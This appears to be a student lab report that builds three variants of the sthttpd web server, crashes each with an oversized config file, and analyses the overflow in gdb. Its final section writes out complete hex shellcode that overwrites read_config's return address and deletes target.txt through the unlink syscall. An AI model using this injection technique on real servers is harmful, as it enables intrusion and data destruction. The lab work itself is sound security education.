Robert Griffith
304833256


[ 1 & 2 ]

The path is set so the proper version of gcc is run.
	input:	export PATH=/usr/local/cs/bin:$PATH
	input:	cd Documents/sthttpd-2.27.0 
I already untarred it in windows by extracting the files
	input:	./configure \ LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

	input:	make clean
	input:	make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
	input:	mv src/thttpd src/thttpd-sp

	input:	make clean
	input:	make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
	input:	mv src/thttpd src/thttpd-as

	input:	make clean
	input:	make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
	input:	mv src/thttpd src/thttpd-no


[ 3 & 4 ]

12330 + 3 * (304833256 % 293) = 12804
ports are 12805, 12806, 12807

	input:	src/thttpd-sp -p 12805 -D
I opened a new terminal to test the runnig server.
foo.txt is a text file with "test" in it, made in the folder sthttpd-2.27.0 
	input:	curl http://localhost:12805/foo.txt
It sucessfully retuned "test"
I return to the terminal with the server to kill the process.
	input:	<^C>

	input:	src/thttpd-as -p 12806 -D
I opened a new terminal to test the runnig server.
	input:	curl http://localhost:12806/foo.txt
It successfully retuned "test".
I return to the terminal with the server to kill the process.
	input:	<^C>

	input:	src/thttpd-no -p 12807 -D
I opened a new terminal to test the runnig server.
	input:	curl http://localhost:12807/foo.txt
It successfully retuned "test".
I return to the terminal with the server to kill the process.
	input:	<^C>

[ 5 ]

A text file, config.txt is written to contain 405 characters (between 100 and 1000 and more than long enough to crash all three variants of thttpd). 
It follows the format of "port=StacksmashStacksmash...", where Stacksmash is repeated 40 times.

	input:	gdb src/thttpd-sp
	input:	run -p 12805 -D -C config.txt
	output:	Program received signal SIGSEV, Segmentation fault.
A backtrace is conducted to find the source or close to the source of the crash.	
	input:	bt
	output:

#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405036 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x6b63617453687361 in ?? ()
#8  0x6174536873616d73 in ?? ()
#9  0x536873616d736b63 in ?? ()
#10 0x73616d736b636174 in ?? ()
#11 0x6d736b6361745368 in ?? ()
#12 0x6b63617453687361 in ?? ()
#13 0x6174536873616d73 in ?? ()
#14 0x536873616d736b63 in ?? ()
#15 0x73616d736b636174 in ?? ()
#16 0x6d736b6361745368 in ?? ()
#17 0x6b63617453687361 in ?? ()
#18 0x6174536873616d73 in ?? ()
#19 0x536873616d736b63 in ?? ()
#20 0x73616d736b636174 in ?? ()
#21 0x6d736b6361745368 in ?? ()
#22 0x6b63617453687361 in ?? ()
#23 0x6174536873616d73 in ?? ()
#24 0x536873616d736b63 in ?? ()
#25 0x73616d736b636174 in ?? ()
#26 0x6d736b6361745368 in ?? ()
#27 0x6b63617453687361 in ?? ()
#28 0x6174536873616d73 in ?? ()
#29 0x536873616d736b63 in ?? ()
#30 0x73616d736b636174 in ?? ()
#31 0x6d736b6361745368 in ?? ()
#32 0x6b63617453687361 in ?? ()
#33 0x6174536873616d73 in ?? ()
#34 0x536873616d736b63 in ?? ()
#35 0x73616d736b636174 in ?? ()
#36 0x6d736b6361745368 in ?? ()
#37 0x6b63617453687361 in ?? ()
#38 0x6174536873616d73 in ?? ()
#39 0x536873616d736b63 in ?? ()
#40 0x73616d736b636174 in ?? ()
#41 0x6d736b6361745368 in ?? ()
#42 0x6b63617453687361 in ?? ()
#43 0x6174536873616d73 in ?? ()
#44 0x536873616d736b63 in ?? ()
#45 0x73616d736b636174 in ?? ()
#46 0x6d736b6361745368 in ?? ()
#47 0x6b63617453687361 in ?? ()
#48 0x6174536873616d73 in ?? ()
#49 0x536873616d736b63 in ?? ()
#50 0x73616d736b636174 in ?? ()
#51 0x0000000000000068 in ?? ()
#52 0x0000000000000000 in ?? ()

The backtrace showed that read_config was the most likely source of the segmentation fault. 
It pointed to 0x405036 in read_config, which was the instruction after __stack_chk_fail() in the backtrace.

I looked through the disassembled code to find 0x405036.
	input:	disassemble read_config
A call to __stack_chk_fail() was made in the instruction before it.
I put a breakpoint at line 1188, a couple lines before 1190 which corresponds to 0x405036, and by breaking through that I found where the canary was checked and when __stack_chk_fail() was called.


The following machine instruction was found to be the source of the crash:

0x405031	callq	0x402490	<__stack_chk_fail@plt>

This function crashes the process and signals a segmentation fault.
It is called when stack smashing is detected due to a canary having been overwritten with a different value.

The canary is created early in the function, before the string from config.txt is loaded.
The canary is a sudo-random 64 bit value, and is stored 68 bytes above where rsp is pointing to in the stack. This can be seen in the following machine instructions:

0x404a54	mov	%fs:0x28,%rax
0x404a5d	mov	%rax,0x68(%rsp)
0x404a62	xor	%eax,%eax
0x404a64	callq	0x402880	<fopen@plt>
0x404a69	test	%rax,%rax
0x404a6c	je	0x50501f	<read_config+1500>

The last four lines clear rax, read the string from config.txt, and checks to see if the file was sucessfully loaded. 
In this case there is no error in loading due to the string in config.txt being less than 1000 characters long, so the jump is not taken.

The check of the canary, and jump to 0x405031 is seen later on in the following assembly code after the string has overrun the stack:

0x404f03	mov	0x68(%rsp),%rax
0x404f08	xor	%fs:0x28,%rax
0x404f11	jne	0x405031	<read_config+1521>


[ 6 ]

config.txt was kept the same, as it did not need to be changed to crash thttpd-as.

	input:	gdb src/thttpd-as
	input:	run -p 12806 -D -C config.txt
	output:	Program received signal SIGSEV, Segmentation fault.
	input:	bt
	output:

#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffbd00, pc=4435657, max_depth=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
    context=0x0, bp=140737488342496, pc=4435657, max_depth=256, 
    stack=0x7fffffffbd00)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
#4  __asan::ReportGenericError (pc=<optimized out>, 
    bp=bp@entry=140737488342496, sp=sp@entry=140737488340368, 
    addr=addr@entry=140737488342660, is_write=is_write@entry=false, 
    access_size=access_size@entry=407, exp=<optimized out>, 
    fatal=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, 
    c=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
    at thttpd.c:1018
#7  0x73616d736b636174 in ?? ()
#8  0x6d736b6361745368 in ?? ()
#9  0x6b63617453687361 in ?? ()
#10 0x6174536873616d73 in ?? ()
#11 0x536873616d736b63 in ?? ()
#12 0x73616d736b636174 in ?? ()
#13 0x6d736b6361745368 in ?? ()
#14 0x6b63617453687361 in ?? ()
#15 0x6174536873616d73 in ?? ()
#16 0x536873616d736b63 in ?? ()
#17 0x73616d736b636174 in ?? ()
#18 0x6d736b6361745368 in ?? ()
#19 0x6b63617453687361 in ?? ()
#20 0x6174536873616d73 in ?? ()
#21 0x536873616d736b63 in ?? ()
#22 0x73616d736b636174 in ?? ()
#23 0x6d736b6361745368 in ?? ()
#24 0x6b63617453687361 in ?? ()
#25 0x6174536873616d73 in ?? ()
#26 0x536873616d736b63 in ?? ()
#27 0x73616d736b636174 in ?? ()
#28 0x6d736b6361745368 in ?? ()
#29 0x6b63617453687361 in ?? ()
#30 0x00000a6873616d73 in ?? ()
#31 0x0000000000000000 in ?? ()

Similar to problem 5, the backtrace shows that the error is in read config but this time it happens around line 1018 at address 0x4e0b51.

I looked through the disassembled code to find 0x4e0b51.
	input:	disassemble read_config
A call to __interceptor_strchr(char const*, int) was made in the instruction before it.
I put a breakpoint at line 1016, a couple lines before 1018 so I could step through and confirmed that this function is what threw the error a segmentation fault:

0x4e0b4c	callq	0x43b080	<__interceptor_strchr(char const*, int)>

When this function was called control then passed through multiple address sanitization functions as seen in the backtrace, which reported the SIGSEV error and caused the program to crash.


[ 7 ]

config.txt does not need to be changed, as it is long enough to overflow.
To crash thttpd-no it simply needs to be run.
	input:	gdb src/thttpd-no
	input:	set disassemble-next-line on
	input:	run -p 12806 -D -C config.txt
	output:	

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
1190	    }
   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
   0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
   0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
   0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
   0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
=> 0x0000000000404d9f <read_config+1215>:	c3	retq   

A backtrace is conducted.
	input:	bt
	output:

#0  0x0000000000404d9f in read_config (filename=<optimized out>)
    at thttpd.c:1190
#1  0x6b63617453687361 in ?? ()
#2  0x6174536873616d73 in ?? ()
#3  0x536873616d736b63 in ?? ()
#4  0x73616d736b636174 in ?? ()
#5  0x6d736b6361745368 in ?? ()
#6  0x6b63617453687361 in ?? ()
#7  0x6174536873616d73 in ?? ()
#8  0x536873616d736b63 in ?? ()
#9  0x73616d736b636174 in ?? ()
#10 0x6d736b6361745368 in ?? ()
#11 0x6b63617453687361 in ?? ()
#12 0x6174536873616d73 in ?? ()
#13 0x536873616d736b63 in ?? ()
#14 0x73616d736b636174 in ?? ()
#15 0x6d736b6361745368 in ?? ()
#16 0x6b63617453687361 in ?? ()
#17 0x6174536873616d73 in ?? ()
#18 0x536873616d736b63 in ?? ()
#19 0x73616d736b636174 in ?? ()
#20 0x6d736b6361745368 in ?? ()
#21 0x6b63617453687361 in ?? ()
#22 0x6174536873616d73 in ?? ()
#23 0x536873616d736b63 in ?? ()
#24 0x73616d736b636174 in ?? ()
#25 0x6d736b6361745368 in ?? ()
#26 0x6b63617453687361 in ?? ()
#27 0x6174536873616d73 in ?? ()
#28 0x536873616d736b63 in ?? ()
#29 0x73616d736b636174 in ?? ()
#30 0x6d736b6361745368 in ?? ()
#31 0x6b63617453687361 in ?? ()
#32 0x0000006873616d73 in ?? ()
#33 0x0000000000000000 in ?? ()

In this case there was no address sanitization or stack protection to catch the segmentation fault so the buffer overflow occurred and the program proceeded all the way until read_config returned.
Due to the buffer overflow the return adress had been overwritten. 
When the function tried to return it threw a segmentation fault as the return address was not a valid place in memory, which is indicative that buffer overflow had occurred.
The adresses shown in the backtrace following the return from read_config() are all various parts of the string in config.txt, illustrating the overflow.


[ 8 ]

The initialization process seen in [ 1 & 2 ] is repeated to be safe.
	input:	export PATH=/usr/local/cs/bin:$PATH
	input:	cd Documents/sthttpd-2.27.0 
	input:	./configure \ LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

The three assembly files are compiled, this time using the flag '-S' in place of '-g3'.
	input:	make clean
	input:	make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
	input:	mv src/thttpd.o src/thttpd-sp.s

	input:	make clean
	input:	make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
	input:	mv src/thttpd.o src/thttpd-as.s

	input:	make clean
	input:	make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
	input:	mv src/thttpd.o src/thttpd-no.s

The assembly code of handle_read for thttpd-sp and thttpd-no is functionally exactly the same.
They have the same machine instructions, with the only difference being the label numbers (e.g. .L426 vs .L416).
This is because the -fstack-protector-strong option used in compiling thttpd-sp and thttpd-sp.s implements a canary in read_config, and checks for the canary before returning from read_config. 
None of the stack protection is concerned with after read_config returns.
In thttpd-no and thttpd-no.s there is simply no stack protection at all due to -fno-stack-protector, so handle_read is unaltered as well.
Therfore handle_read in thttpd-sp and thttpd-sp.s is the same as it is in thttpd-no and thttpd-no.s.

thttpd-as and thttpd-as.s differ from the other two variants because -fsanitize=address applies many tests to handle_read, making the assembly code for the function much longer.
AddressSanitizer uses shadow memory to record if each byte of memory is safe to acces and checks designated shadow memory on each load or store.
This applies not only to the stack, but also to global variables and the heap.
An example of the checking is shown below:

leaq	536(%rbx), %rdi
movq	%rdi, %rax
shrq	$3, %rax
cmpb	$0, 2147450880(%rax)
jne	.L1196

The checks involve the computation of an address' corresponding shadow byte's address by shifting the address right by three and adding an offset.
The value of the shadow byte is then compared to zero, and if it is not zero than there was overflow as that adress whas not supposed to be written to, and the program will crash.
This constant checking of the shadow memory designated around the buffer significantly adds to the length and overhead of handle_read.


[ 9 ]

exploit.txt starts as just "port=xxxxxxxxxx..."" with 200 exes.
What is in exploit.txt doesn't matter initially, as the initial goal is to determine the limits of the buffer.
	input:	gdb src/thttpd-no
	input:	b read_config
	input:	run -p 12807 -D -C exploit.txt
It breaks at the beginning of read_config and I step through until the while loop that will be reading in the string to the stack is called.
	input:	p &line
This will give me the address of the base of the stack.

base of stack:				0x7fffffffcf80

	input:	set disassemble-next-line on
	input:	b 1188
I know this is before the return of read_config from earlier experience.
	input:	c
I then step through until I get to the return instruction at 0x404d9f.
	input:	info registers
The value at rsp will give us the other bound of the buffer.

return address location:	0x7fffffffd018

From these values the size of the buffer is calculated to be 152 bytes.
I reduced the number of exes in my exploit.txt string to 147.

The exploit.txt file would now start with "port=" in hexadecimal, followed by 147 capital exes, an 8 byte return address (yet to be decided), and the hex code for "target.txt" with a null byte 00.

Unlink will be called by syscall when rax has a value of 87 stored in it.

To figure out the byte code for moving the hex code for "target.txt" into rdi and the byte code for moving 87 into eax, test.s was made with the following lines:

mov $0x7fffffffd020,%rdi
mov $87,%eax

This file was then compiled by gcc and put into objdump.
0x7fffffffd020 was obtained by adding 152+8 to the base of the stack.
This is where the file name "target.txt" is stored, right after the return address.

The byte codes obtained from objdump, in order, are:

48bf20d0ffffff7f0000
b857000000

0f05 was found to be the byte code for syscall through research.

0x7fffffffd02b was found to be the address of the first instruction (which is 48bf20d0ffffff7f0000) by adding 152+8+11 to the base of the stack.
This first instruction is in the overflow, and comes after the return address and the file name "target.txt" string.

The hexadecimal value for "port=" is simply 706f72743d and the value for each "X" is simply 58.

Patching these hexadecimal codes together in proper order yields (without the line break):

706f72743d5858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858
585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858582bd0ffffff7f00007461726765742e7478740048bf20d0ffffff7f0000b8570000000f05

This value is put into exploit.txt, without the line break, which is soon converted into a binary file exp.bin.
	input:	xxd -r -p exploit.txt exb.bin
	input:	gdb src/thttpd-no
	input:	set disassemble-next-line on
	input:	b 1190 
A break point is set at the end of read_config, and thttpd-no is run with exp.bin in an attempt to oveflow the buffer, take control, and delete target.txt.
	input:	run -p 12807 -D -C exp.bin
The program is stepped through until read_config returns and the following is the result:

0x0000000000404d9f	1190	    }
   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
   0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
   0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
   0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
   0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
=> 0x0000000000404d9f <read_config+1215>:	c3	retq   
0x00007fffffffd02b in ?? ()
=> 0x00007fffffffd02b:	48 bf 20 d0 ff ff ff 7f 00 00	movabs $0x7fffffffd020,%rdi
0x00007fffffffd035 in ?? ()
=> 0x00007fffffffd035:	b8 57 00 00 00	mov    $0x57,%eax
0x00007fffffffd03a in ?? ()
=> 0x00007fffffffd03a:	0f 05	syscall 

A few instructions that were never intended to be executed are executed after this, causing a segmentation fault.

0x00007fffffffd03c in ?? ()
=> 0x00007fffffffd03c:	00 7f 00	add    %bh,0x0(%rdi)
0x00007fffffffd03f in ?? ()
=> 0x00007fffffffd03f:	00 b0 e2 ff ff ff	add    %dh,-0x1e(%rax)

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffd03f in ?? ()
=> 0x00007fffffffd03f:	00 b0 e2 ff ff ff	add    %dh,-0x1e(%rax)

Program terminated with signal SIGSEGV, Segmentation fault.

GDB is quit out of and the main directory is checked for target.txt, which was successfully removed.
